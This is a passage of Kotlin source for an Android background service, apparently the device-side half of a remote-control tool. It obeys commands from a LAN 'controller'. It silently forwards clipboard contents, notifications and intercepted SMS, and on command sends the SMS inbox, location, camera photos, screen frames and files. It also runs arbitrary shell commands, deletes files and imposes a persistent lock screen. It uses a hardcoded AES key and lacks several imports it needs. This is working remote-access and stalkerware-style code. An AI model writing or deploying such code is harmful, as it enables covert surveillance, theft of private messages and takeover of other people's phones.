package com.example.target

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.nsd.NsdManager
import android.net.nsd.NsdServiceInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.os.Environment
import android.util.Base64
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.net.Uri
import android.media.MediaPlayer
import android.media.AudioManager
import android.media.RingtoneManager
import android.telephony.SmsMessage
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.hardware.display.VirtualDisplay
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.graphics.PixelFormat
import android.graphics.Bitmap
import androidx.core.app.NotificationCompat
import com.example.shared.CryptoUtils
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.ByteArrayOutputStream
import java.io.InputStreamReader
import java.util.concurrent.ConcurrentHashMap
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread

class TargetConnectionService : Service() {

    private var socketClient: TargetSocketClient? = null
    private var nsdManager: NsdManager? = null
    private var discoveryListener: NsdManager.DiscoveryListener? = null
    
    private var clipboardManager: ClipboardManager? = null
    private var clipboardListener: ClipboardManager.OnPrimaryClipChangedListener? = null
    private var notificationReceiver: BroadcastReceiver? = null
    
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    
    private var lastReceivedClipboardText = ""
    private val activeUploadFiles = ConcurrentHashMap<String, ByteArrayOutputStream>()
    private var mediaPlayer: MediaPlayer? = null
    private var originalVolume: Int = -1
    private var originalMode: Int = -1
    private var cameraReceiver: BroadcastReceiver? = null
    private var smsReceiver: BroadcastReceiver? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var isMirroring = false
    private var mirrorThread: Thread? = null

    // Testing key: 32 bytes of '1' for AES-256
    private val secretKey = SecretKeySpec(ByteArray(32) { 1.toByte() }, "AES")

    companion object {
        private const val CHANNEL_ID = "TargetP2PChannel"
        private const val NOTIFICATION_ID = 101
        private const val SERVICE_TYPE = "_androidp2p._tcp"
    }

    override fun onCreate() {
        super.onCreate()
        acquireLocks()
        startForegroundServiceNotification()
        setupNsd()
        setupClipboardSync()
        setupNotificationSync()
        setupCameraReceiver()
        setupSmsReceiver()

        val prefs = getSharedPreferences("TargetPrefs", Context.MODE_PRIVATE)
        if (prefs.getBoolean("is_locked", false)) {
            val message = prefs.getString("lock_message", "") ?: ""
            val phone = prefs.getString("lock_phone", "") ?: ""
            val lockIntent = Intent(applicationContext, LockMessageActivity::class.java).apply {
                putExtra("message", message)
                putExtra("phone", phone)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(lockIntent)
        }
    }

    private fun acquireLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TargetApp::WakeLock")
            wakeLock?.acquire(10 * 60 * 1000L /*10 minutes fallback*/)

            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "TargetApp::WifiLock")
            wifiLock?.acquire()
        } catch (e: Exception) {
            println("Failed to acquire locks: ${e.message}")
        }
    }

    private fun setupClipboardSync() {
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
            val clipData = clipboardManager?.primaryClip
            if (clipData != null && clipData.itemCount > 0) {
                val text = clipData.getItemAt(0).text?.toString()
                if (text != null && text.isNotEmpty() && text != lastReceivedClipboardText) {
                    thread {
                        socketClient?.sendResult("CLIPBOARD:$text")
                    }
                }
            }
        }
        clipboardManager?.addPrimaryClipChangedListener(clipboardListener)
    }

    private fun setupNotificationSync() {
        notificationReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == "com.example.target.NOTIFICATION_EVENT") {
                    val packageName = intent.getStringExtra("package") ?: ""
                    val title = intent.getStringExtra("title") ?: ""
                    val text = intent.getStringExtra("text") ?: ""
                    thread {
                        socketClient?.sendResult("NOTIFICATION:[$packageName] $title: $text")
                    }
                }
            }
        }
        val filter = IntentFilter("com.example.target.NOTIFICATION_EVENT")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(notificationReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(notificationReceiver, filter)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "START_PROJECTION") {
            val resultCode = intent.getIntExtra("resultCode", -1)
            @Suppress("DEPRECATION")
            val resultData = intent.getParcelableExtra("resultData") as? Intent
            if (resultCode != -1 && resultData != null) {
                thread {
                    startScreenMirroring(resultCode, resultData)
                }
            }
        } else {
            startNsdDiscovery()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startForegroundServiceNotification() {
        val channelName = "P2P Target Service"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Target Service Running")
            .setContentText("Listening for controller commands on LAN...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun setupNsd() {
        nsdManager = getSystemService(Context.NSD_SERVICE) as NsdManager
        discoveryListener = object : NsdManager.DiscoveryListener {
            override fun onStartDiscoveryFailed(serviceType: String?, errorCode: Int) {
                nsdManager?.stopServiceDiscovery(this)
            }

            override fun onStopDiscoveryFailed(serviceType: String?, errorCode: Int) {
                nsdManager?.stopServiceDiscovery(this)
            }

            override fun onDiscoveryStarted(serviceType: String?) {}
            override fun onDiscoveryStopped(serviceType: String?) {}

            override fun onServiceFound(serviceInfo: NsdServiceInfo?) {
                if (serviceInfo?.serviceType == SERVICE_TYPE && serviceInfo.serviceName.contains("AndroidP2PController")) {
                    nsdManager?.resolveService(serviceInfo, object : NsdManager.ResolveListener {
                        override fun onResolveFailed(serviceInfo: NsdServiceInfo?, errorCode: Int) {}

                        override fun onServiceResolved(resolvedInfo: NsdServiceInfo?) {
                            resolvedInfo?.let {
                                connectToController(it.host.hostAddress, it.port)
                            }
                        }
                    })
                }
            }

            override fun onServiceLost(serviceInfo: NsdServiceInfo?) {}
        }
    }

    private fun startNsdDiscovery() {
        try {
            nsdManager?.discoverServices(SERVICE_TYPE, NsdManager.PROTOCOL_DNS_SD, discoveryListener)
        } catch (e: Exception) {
            // Ignore
        }
    }

    @Synchronized
    private fun connectToController(ip: String, port: Int) {
        if (socketClient != null) return
        
        socketClient = TargetSocketClient(
            host = ip,
            port = port,
            secretKey = secretKey,
            onCommandReceived = { command ->
                handleCommand(command)
            },
            onConnectionStatusChanged = { connected ->
                if (connected) {
                    thread {
                        val prefs = getSharedPreferences("TargetPrefs", Context.MODE_PRIVATE)
                        val isLocked = prefs.getBoolean("is_locked", false)
                        socketClient?.sendResult("LOCK_STATUS:${if (isLocked) "locked" else "unlocked"}")
                    }
                } else {
                    socketClient = null
                    startNsdDiscovery()
                }
            }
        )
        socketClient?.connect()
    }

    private fun handleCommand(command: String) {
        thread {
            try {
                when {
                    command.startsWith("PING") -> {
                        socketClient?.sendResult("PONG")
                    }
                    command.startsWith("CLIPBOARD:") -> {
                        val text = command.substringAfter("CLIPBOARD:")
                        handleClipboardUpdate(text)
                    }
                    command == "CLIPBOARD_GET" -> {
                        val text = getClipboardText()
                        socketClient?.sendResult("CLIPBOARD:$text")
                    }
                    command.startsWith("LIST_FILES:") -> {
                        val dirPath = command.substringAfter("LIST_FILES:")
                        handleFileListRequest(dirPath)
                    }
                    command.startsWith("DOWNLOAD:") -> {
                        val filePath = command.substringAfter("DOWNLOAD:")
                        handleDownloadRequest(filePath)
                    }
                    command.startsWith("DELETE:") -> {
                        val filePath = command.substringAfter("DELETE:")
                        handleDeleteRequest(filePath)
                    }
                    command.startsWith("MKDIR:") -> {
                        val dirPath = command.substringAfter("MKDIR:")
                        handleMkdirRequest(dirPath)
                    }
                    command.startsWith("FILE_CHUNK_UPLOAD:") -> {
                        val parts = command.substringAfter("FILE_CHUNK_UPLOAD:").split(":", limit = 4)
                        if (parts.size == 4) {
                            val fileName = parts[0]
                            val chunkIndex = parts[1].toInt()
                            val totalChunks = parts[2].toInt()
                            val base64Data = parts[3]
                            handleUploadChunk(fileName, chunkIndex, totalChunks, base64Data)
                        }
                    }
                    command == "GET_DEVICE_INFO" -> {
                        val deviceInfo = getDeviceInfo()
                        socketClient?.sendResult(deviceInfo)
                    }
                    command == "GET_LOCATION" -> {
                        handleLocationRequest()
                    }
                    command == "RING_SIREN" -> {
                        ringSiren()
                    }
                    command == "STOP_SIREN" -> {
                        stopSiren()
                    }
                    command.startsWith("TAKE_PHOTO:") -> {
                        val facing = command.substringAfter("TAKE_PHOTO:")
                        startCameraCapture(facing)
                    }
                    command == "FETCH_SMS" -> {
                        fetchSmsInbox()
                    }
                    command == "START_MIRROR" -> {
                        if (isMirroring) {
                            socketClient?.sendResult("MIRROR_STATUS:active")
                        } else {
                            val activityIntent = Intent(applicationContext, MainActivity::class.java).apply {
                                action = "REQUEST_SCREEN_CAPTURE"
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(activityIntent)
                        }
                    }
                    command == "STOP_MIRROR" -> {
                        stopScreenMirroring()
                    }
                    command == "GET_APPS" -> {
                        getInstalledAppsList()
                    }
                    command.startsWith("LAUNCH_APP:") -> {
                        val pkg = command.substringAfter("LAUNCH_APP:")
                        launchApplication(pkg)
                    }
                    command.startsWith("LOCK_SCREEN:") -> {
                        val payload = command.substringAfter("LOCK_SCREEN:")
                        val parts = payload.split("|", limit = 2)
                        val message = parts.getOrNull(0) ?: ""
                        val phone = parts.getOrNull(1) ?: ""
                        
                        val prefs = getSharedPreferences("TargetPrefs", Context.MODE_PRIVATE)
                        prefs.edit().apply {
                            putString("lock_message", message)
                            putString("lock_phone", phone)
                            putBoolean("is_locked", true)
                            apply()
                        }
                        
                        val lockIntent = Intent(applicationContext, LockMessageActivity::class.java).apply {
                            putExtra("message", message)
                            putExtra("phone", phone)
                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        }
                        startActivity(lockIntent)
                        socketClient?.sendResult("LOCK_STATUS:locked")
                    }
                    command == "UNLOCK_SCREEN" -> {
                        val prefs = getSharedPreferences("TargetPrefs", Context.MODE_PRIVATE)
                        prefs.edit().apply {
                            remove("lock_message")
                            remove("lock_phone")
                            putBoolean("is_locked", false)
                            apply()
                        }
                        
                        val unlockIntent = Intent("com.example.target.UNLOCK_ACTION")
                        sendBroadcast(unlockIntent)
                        socketClient?.sendResult("LOCK_STATUS:unlocked")
                    }
                    command.startsWith("SHELL:") -> {
                        val cmd = command.substringAfter("SHELL:")
                        val response = executeShellCommand(cmd)
                        socketClient?.sendResult("SHELL_OUTPUT:$response")
                    }
                    else -> {
                        socketClient?.sendResult("Unknown command format")
                    }
                }
            } catch (e: Exception) {
                socketClient?.sendResult("Error executing command: ${e.message}")
            }
        }
    }

    private fun getClipboardText(): String {
        var text = ""
        Handler(Looper.getMainLooper()).post {
            try {
                val clipData = clipboardManager?.primaryClip
                if (clipData != null && clipData.itemCount > 0) {
                    text = clipData.getItemAt(0).text?.toString() ?: ""
                }
            } catch (e: Exception) {
                // Ignore
            }
        }
        // Give handler a tiny bit of time to run
        Thread.sleep(100)
        return text
    }

    private fun getDeviceInfo(): String {
        val batteryLevel = try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (e: Exception) {
            -1
        }
        
        // Execute storage check using ProcessBuilder
        val storageOutput = executeShellCommand("df -h /storage/emulated/0")
        var storageInfo = "N/A"
        try {
            val lines = storageOutput.split("\n")
            if (lines.size > 1) {
                val parts = lines[1].split("\\s+".toRegex())
                if (parts.size >= 4) {
                    val size = parts[1]
                    val used = parts[2]
                    val avail = parts[3]
                    storageInfo = "$size ($avail Available)"
                }
            }
        } catch (e: Exception) {
            // fallback
        }
        
        if (storageInfo == "N/A") {
            try {
                val path = Environment.getExternalStorageDirectory()
                val stat = android.os.StatFs(path.path)
                val totalBytes = stat.blockCountLong * stat.blockSizeLong
                val freeBytes = stat.availableBlocksLong * stat.blockSizeLong
                val totalGB = totalBytes / (1024 * 1024 * 1024)
                val freeGB = freeBytes / (1024 * 1024 * 1024)
                storageInfo = "${totalGB}GB (${freeGB}GB Available)"
            } catch (e: Exception) {
                storageInfo = "Unknown Storage"
            }
        }
        
        return "DEVICE_INFO:$batteryLevel%:$storageInfo"
    }

    private fun handleLocationRequest() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)
            val isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
            
            if (!isGpsEnabled && !isNetworkEnabled) {
                socketClient?.sendResult("LOCATION_ERROR:GPS and Network location providers are disabled.")
                return
            }
            
            var bestLocation: Location? = null
            if (isNetworkEnabled) {
                val loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (loc != null) bestLocation = loc
            }
            if (isGpsEnabled) {
                val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                if (loc != null) {
                    if (bestLocation == null || loc.time > bestLocation.time) {
                        bestLocation = loc
                    }
                }
            }
            
            if (bestLocation != null && (System.currentTimeMillis() - bestLocation.time) < 60000) {
                socketClient?.sendResult("LOCATION:${bestLocation.latitude}:${bestLocation.longitude}:${bestLocation.accuracy}:${bestLocation.time}")
                return
            }
            
            Handler(Looper.getMainLooper()).post {
                try {
                    val listener = object : LocationListener {
                        override fun onLocationChanged(location: Location) {
                            thread {
                                socketClient?.sendResult("LOCATION:${location.latitude}:${location.longitude}:${location.accuracy}:${location.time}")
                            }
                            locationManager.removeUpdates(this)
                        }
                        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                        override fun onProviderEnabled(provider: String) {}
                        override fun onProviderDisabled(provider: String) {}
                    }
                    
                    val provider = if (isGpsEnabled) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
                    locationManager.requestSingleUpdate(provider, listener, Looper.getMainLooper())
                } catch (se: SecurityException) {
                    thread {
                        socketClient?.sendResult("LOCATION_ERROR:Permission denied: ${se.message}")
                    }
                } catch (e: Exception) {
                    thread {
                        socketClient?.sendResult("LOCATION_ERROR:Error requesting update: ${e.message}")
                    }
                }
            }
        } catch (se: SecurityException) {
            socketClient?.sendResult("LOCATION_ERROR:Location permission denied: ${se.message}")
        } catch (e: Exception) {
            socketClient?.sendResult("LOCATION_ERROR:${e.message}")
        }
    }

    private fun ringSiren() {
        try {
            stopSiren() // Stop if already playing
            
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            
            originalMode = audioManager.ringerMode
            originalVolume = audioManager.getStreamVolume(AudioManager.STREAM_ALARM)
            
            audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
            
            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)
            
            var alertUri: Uri? = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
            if (alertUri == null) {
                alertUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
            }
            if (alertUri == null) {
                alertUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
            }
            
            mediaPlayer = MediaPlayer().apply {
                setDataSource(applicationContext, alertUri!!)
                setAudioStreamType(AudioManager.STREAM_ALARM)
                isLooping = true
                prepare()
                start()
            }
            
            socketClient?.sendResult("SIREN_STATUS:ringing")
            
            Handler(Looper.getMainLooper()).postDelayed({
                if (mediaPlayer != null) {
                    stopSiren()
                }
            }, 30000)
            
        } catch (e: Exception) {
            socketClient?.sendResult("Error ringing siren: ${e.message}")
        }
    }

    private fun stopSiren() {
        try {
            mediaPlayer?.let {
                if (it.isPlaying) {
                    it.stop()
                }
                it.release()
            }
            mediaPlayer = null
            
            if (originalVolume != -1) {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, originalVolume, 0)
                if (originalMode != -1) {
                    audioManager.ringerMode = originalMode
                }
                originalVolume = -1
                originalMode = -1
            }
            
            socketClient?.sendResult("SIREN_STATUS:idle")
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun setupCameraReceiver() {
        cameraReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == "com.example.target.PHOTO_CAPTURED") {
                    val status = intent.getStringExtra("status") ?: "error"
                    if (status == "success") {
                        val filePath = intent.getStringExtra("file_path") ?: ""
                        thread {
                            sendCapturedPhoto(filePath)
                        }
                    } else {
                        val errMsg = intent.getStringExtra("message") ?: "Unknown error"
                        thread {
                            socketClient?.sendResult("PHOTO_ERROR:$errMsg")
                        }
                    }
                }
            }
        }
        val filter = IntentFilter("com.example.target.PHOTO_CAPTURED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(cameraReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(cameraReceiver, filter)
        }
    }

    private fun startCameraCapture(facing: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                val intent = Intent(applicationContext, CameraCaptureActivity::class.java).apply {
                    putExtra("facing", facing)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            } catch (e: Exception) {
                thread {
                    socketClient?.sendResult("PHOTO_ERROR:Failed to start Camera Activity: ${e.message}")
                }
            }
        }
    }

    private fun sendCapturedPhoto(filePath: String) {
        val file = File(filePath)
        if (!file.exists()) {
            socketClient?.sendResult("PHOTO_ERROR:Captured file not found on Target")
            return
        }

        try {
            val fileBytes = file.readBytes()
            file.delete() // clean up immediately
            
            val chunkSize = 128 * 1024 // 128KB chunks
            val totalChunks = kotlin.math.ceil(fileBytes.size.toDouble() / chunkSize).toInt()
            
            for (i in 0 until totalChunks) {
                val start = i * chunkSize
                val end = kotlin.math.min(start + chunkSize, fileBytes.size)
                val chunk = fileBytes.copyOfRange(start, end)
                val base64Data = Base64.encodeToString(chunk, Base64.NO_WRAP)
                socketClient?.sendResult("PHOTO_CHUNK:$i:$totalChunks:$base64Data")
                Thread.sleep(50) // prevent queue congestion
            }
        } catch (e: Exception) {
            socketClient?.sendResult("PHOTO_ERROR:Error reading photo: ${e.message}")
        }
    }

    private fun setupSmsReceiver() {
        smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
                    try {
                        val bundle = intent.extras
                        if (bundle != null) {
                            val pdus = bundle.get("pdus") as? Array<*>
                            if (pdus != null) {
                                val format = bundle.getString("format")
                                for (pdu in pdus) {
                                    val sms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                        SmsMessage.createFromPdu(pdu as ByteArray, format)
                                    } else {
                                        @Suppress("DEPRECATION")
                                        SmsMessage.createFromPdu(pdu as ByteArray)
                                    }
                                    val sender = sms.originatingAddress ?: "Unknown"
                                    val body = sms.messageBody ?: ""
                                    thread {
                                        socketClient?.sendResult("SMS_RECEIVED:$sender:$body")
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        // Ignore
                    }
                }
            }
        }
        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED").apply {
            priority = 999
        }
        registerReceiver(smsReceiver, filter)
    }

    private fun fetchSmsInbox() {
        thread {
            try {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                    socketClient?.sendResult("SMS_HISTORY_ERROR:Permission denied to read SMS inbox")
                    return@thread
                }

                val smsUri = Uri.parse("content://sms/inbox")
                val projection = arrayOf("_id", "address", "body", "date")
                val cursor = contentResolver.query(
                    smsUri,
                    projection,
                    null,
                    null,
                    "date DESC LIMIT 5"
                )

                val jsonArray = JSONArray()
                cursor?.use {
                    while (it.moveToNext()) {
                        val sender = it.getString(it.getColumnIndexOrThrow("address")) ?: "Unknown"
                        val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                        val date = it.getLong(it.getColumnIndexOrThrow("date"))
                        
                        val obj = JSONObject().apply {
                            put("sender", sender)
                            put("body", body)
                            put("date", date)
                        }
                        jsonArray.put(obj)
                    }
                }

                socketClient?.sendResult("SMS_HISTORY:${jsonArray.toString()}")
            } catch (e: Exception) {
                socketClient?.sendResult("SMS_HISTORY_ERROR:${e.message}")
            }
        }
    }

    private fun startScreenMirroring(resultCode: Int, resultData: Intent) {
        try {
            stopScreenMirroring()
            
            val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)
            if (mediaProjection == null) {
                socketClient?.sendResult("SCREEN_ERROR:Failed to obtain MediaProjection")
                return
            }

            val width = 480
            val height = 800
            val dpi = 160

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenMirror",
                width,
                height,
                dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null,
                null
            )

            isMirroring = true
            socketClient?.sendResult("MIRROR_STATUS:active")

            mirrorThread = thread {
                val cleanWidth = width
                val cleanHeight = height
                
                while (isMirroring) {
                    try {
                        Thread.sleep(300)
                        val reader = imageReader ?: break
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val planes = image.planes
                            val buffer = planes[0].buffer
                            val pixelStride = planes[0].pixelStride
                            val rowStride = planes[0].rowStride
                            val rowPadding = rowStride - pixelStride * cleanWidth

                            val bitmap = Bitmap.createBitmap(
                                cleanWidth + rowPadding / pixelStride,
                                cleanHeight,
                                Bitmap.Config.ARGB_8888
                            )
                            bitmap.copyPixelsFromBuffer(buffer)
                            image.close()

                            val cleanBitmap = Bitmap.createBitmap(bitmap, 0, 0, cleanWidth, cleanHeight)
                            
                            val outStream = ByteArrayOutputStream()
                            cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 60, outStream)
                            val jpegBytes = outStream.toByteArray()
                            val base64 = Base64.encodeToString(jpegBytes, Base64.NO_WRAP)
                            
                            socketClient?.sendResult("SCREEN_FRAME:$base64")
                        }
                    } catch (e: Exception) {
                        // Ignore
                    }
                }
            }

        } catch (e: Exception) {
            socketClient?.sendResult("SCREEN_ERROR:Start mirror error: ${e.message}")
        }
    }

    private fun stopScreenMirroring() {
        try {
            isMirroring = false
            mirrorThread?.interrupt()
            mirrorThread = null
            
            virtualDisplay?.release()
            virtualDisplay = null
            
            imageReader?.close()
            imageReader = null
            
            mediaProjection?.stop()
            mediaProjection = null
            
            socketClient?.sendResult("MIRROR_STATUS:inactive")
        } catch (e: Exception) {
            // Ignore
        }
    }

    private fun getInstalledAppsList() {
        thread {
            try {
                val mainIntent = Intent(Intent.ACTION_MAIN, null).apply {
                    addCategory(Intent.CATEGORY_LAUNCHER)
                }
                
                val list = packageManager.queryIntentActivities(mainIntent, 0)
                val jsonArray = JSONArray()
                
                for (info in list) {
                    val appName = info.loadLabel(packageManager).toString()
                    val packageName = info.activityInfo.packageName
                    
                    val obj = JSONObject().apply {
                        put("name", appName)
                        put("package", packageName)
                    }
                    jsonArray.put(obj)
                }
                
                socketClient?.sendResult("APPS_LIST:${jsonArray.toString()}")
            } catch (e: Exception) {
                socketClient?.sendResult("APPS_LIST_ERROR:${e.message}")
            }
        }
    }

    private fun launchApplication(packageName: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                val intent = packageManager.getLaunchIntentForPackage(packageName)
                if (intent != null) {
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(intent)
                    thread {
                        socketClient?.sendResult("LAUNCH_STATUS:success")
                    }
                } else {
                    thread {
                        socketClient?.sendResult("LAUNCH_ERROR:App has no launch intent")
                    }
                }
            } catch (e: Exception) {
                thread {
                    socketClient?.sendResult("LAUNCH_ERROR:${e.message}")
                }
            }
        }
    }

    private fun handleClipboardUpdate(text: String) {
        lastReceivedClipboardText = text
        Handler(Looper.getMainLooper()).post {
            try {
                val clipData = android.content.ClipData.newPlainText("P2P Clipboard", text)
                clipboardManager?.setPrimaryClip(clipData)
            } catch (e: Exception) {
                // Ignore
            }
        }
    }

    private fun handleFileListRequest(dirPath: String) {
        val dir = File(dirPath)
        if (!dir.exists()) {
            socketClient?.sendResult("LIST_FILES_JSON:{\"status\":\"error\",\"message\":\"Directory does not exist\"}")
            return
        }
        if (!dir.isDirectory) {
            socketClient?.sendResult("LIST_FILES_JSON:{\"status\":\"error\",\"message\":\"Path is not a directory\"}")
            return
        }

        try {
            val files = dir.listFiles()
            if (files == null) {
                socketClient?.sendResult("LIST_FILES_JSON:{\"status\":\"error\",\"message\":\"Permission denied or cannot read directory\"}")
                return
            }

            val jsonArray = JSONArray()
            for (file in files) {
                val jsonObject = JSONObject()
                jsonObject.put("name", file.name)
                jsonObject.put("isDirectory", file.isDirectory)
                jsonObject.put("fullPath", file.absolutePath)
                
                val sizeStr = if (file.isDirectory) {
                    "--"
                } else {
                    formatFileSize(file.length())
                }
                jsonObject.put("size", sizeStr)
                jsonArray.put(jsonObject)
            }
            socketClient?.sendResult("LIST_FILES_JSON:" + jsonArray.toString())
        } catch (e: Exception) {
            socketClient?.sendResult("LIST_FILES_JSON:{\"status\":\"error\",\"message\":\"${e.message}\"}")
        }
    }

    private fun formatFileSize(size: Long): String {
        if (size <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB", "TB")
        val digitGroups = (Math.log10(size.toDouble()) / Math.log10(1024.0)).toInt()
        return String.format("%.1f %s", size / Math.pow(1024.0, digitGroups.toDouble()), units[digitGroups])
    }

    private fun handleDeleteRequest(filePath: String) {
        val file = File(filePath)
        if (!file.exists()) {
            socketClient?.sendResult("DELETE_RESULT:${file.name}:false (File not found)")
            return
        }
        val deleted = file.deleteRecursively()
        socketClient?.sendResult("DELETE_RESULT:${file.name}:$deleted")
    }

    private fun handleMkdirRequest(dirPath: String) {
        val dir = File(dirPath)
        val created = dir.mkdirs()
        socketClient?.sendResult("MKDIR_RESULT:${dir.name}:$created")
    }

    private fun handleDownloadRequest(filePath: String) {
        val file = File(filePath)
        if (!file.exists() || file.isDirectory) {
            socketClient?.sendResult("DOWNLOAD_ERROR:File not found or is a directory")
            return
        }

        try {
            val fileBytes = file.readBytes()
            val chunkSize = 256 * 1024
            val totalChunks = kotlin.math.ceil(fileBytes.size.toDouble() / chunkSize).toInt()

            for (i in 0 until totalChunks) {
                val start = i * chunkSize
                val end = kotlin.math.min(start + chunkSize, fileBytes.size)
                val chunk = fileBytes.copyOfRange(start, end)
                val base64Data = Base64.encodeToString(chunk, Base64.NO_WRAP)
                socketClient?.sendResult("FILE_CHUNK_DOWNLOAD:${file.name}:$i:$totalChunks:$base64Data")
            }
        } catch (e: Exception) {
            socketClient?.sendResult("DOWNLOAD_ERROR:${e.message}")
        }
    }

    private fun handleUploadChunk(fileName: String, chunkIndex: Int, totalChunks: Int, base64Data: String) {
        try {
            val chunkBytes = Base64.decode(base64Data, Base64.NO_WRAP)
            val stream = activeUploadFiles.getOrPut(fileName) { ByteArrayOutputStream() }
            stream.write(chunkBytes)

            socketClient?.sendResult("UPLOAD_PROGRESS:$fileName:$chunkIndex:$totalChunks")

            if (chunkIndex == totalChunks - 1) {
                val fileBytes = stream.toByteArray()
                val downloadDir = getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS) ?: filesDir
                val destFile = File(downloadDir, fileName)
                destFile.writeBytes(fileBytes)

                activeUploadFiles.remove(fileName)
                socketClient?.sendResult("UPLOAD_SUCCESS:$fileName saved to ${destFile.absolutePath}")
            }
        } catch (e: Exception) {
            socketClient?.sendResult("UPLOAD_ERROR:$fileName: ${e.message}")
            activeUploadFiles.remove(fileName)
        }
    }

    private fun executeShellCommand(command: String): String {
        return try {
            val process = ProcessBuilder()
                .command("/system/bin/sh", "-c", command)
                .redirectErrorStream(true)
                .start()
            
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = StringBuilder()
            var line: String?
            
            val startTime = System.currentTimeMillis()
            while (reader.readLine().also { line = it } != null) {
                output.append(line).append("\n")
                if (System.currentTimeMillis() - startTime > 10000) { // 10 seconds timeout
                    process.destroy()
                    output.append("\n[Process Terminated due to timeout]")
                    break
                }
            }
            process.waitFor()
            output.toString().ifEmpty { "Command executed with empty output." }
        } catch (e: Exception) {
            "Execution error: ${e.message}"
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopScreenMirroring()
        socketClient?.disconnect()
